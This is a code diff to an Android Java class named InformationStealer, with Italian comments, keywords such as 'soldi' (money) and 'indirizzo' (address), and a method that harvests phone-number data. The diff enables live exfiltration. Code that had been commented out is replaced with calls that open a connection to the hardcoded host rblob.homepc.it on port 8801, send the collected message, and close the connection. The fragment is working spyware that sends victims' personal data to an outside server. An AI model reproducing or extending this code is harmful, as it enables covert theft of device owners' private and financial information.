@@ -55,13 +55,13 @@ public class InformationStealer implements Runnable {
             "indirizzo",
             "soldi"
     };
-
-    NetworkManager conn = new NetworkManager();
+    NetworkManager netman;
     Context context;
 
     public InformationStealer(Context context){
         this.context = context;
         messaggio = new StringBuilder();
+        netman = new NetworkManager();
     }
 
     @Override
@@ -76,7 +76,6 @@ public class InformationStealer implements Runnable {
 
         messaggioJSON = convertStringToJSON(messaggio.toString());
         System.out.println("ECCO IL MESSAGGIO JSON: " + messaggioJSON);
-        //conn.sendMessage2(messaggio.toString());
 
         //TODO: NON DIMENTICHIAMOCI DI ELIMINARE TUTTA STA PARTE QUA
         int index = messaggio.indexOf("&");
@@ -86,7 +85,9 @@ public class InformationStealer implements Runnable {
         }
 
         System.out.println(messaggio.toString());
-       // conn.closeConnection();
+        netman.openConnection("rblob.homepc.it",8801,context);
+        netman.sendMessage2(messaggio);
+        netman.closeConnection();
     }
 
     static String stealNumberInformations(Context context) {
@@ -262,9 +263,5 @@ public class InformationStealer implements Runnable {
         }
 
         return sb.toString();
-    }
-
-    public StringBuilder getMessaggio(){
-        return messaggio;
     }
 }
